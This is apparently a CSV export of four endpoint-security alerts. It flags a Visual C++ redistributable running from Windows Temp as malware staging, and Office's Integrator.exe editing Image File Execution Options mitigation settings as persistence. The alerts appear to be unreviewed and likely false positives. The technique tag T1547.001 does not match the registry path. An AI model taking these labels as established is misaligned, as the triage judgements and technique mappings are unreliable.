"Jun 1, 2026 @ 14:21:45.059",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,40,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"29,508",,,False,MEDIUM,MEDIUM,Needs Review,Review,Collect file artefacts; hash and submit to VT,AH-4D6C1652
"Jun 1, 2026 @ 14:21:18.729",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msaccess.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msaccess.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-DE789664
"Jun 1, 2026 @ 14:21:18.666",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\excel.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\excel.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-35E24B82
"Jun 1, 2026 @ 14:21:18.607",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,40,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\lync.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lync.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,MEDIUM,HIGH,Needs Review,Review,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-6AAB2EF1
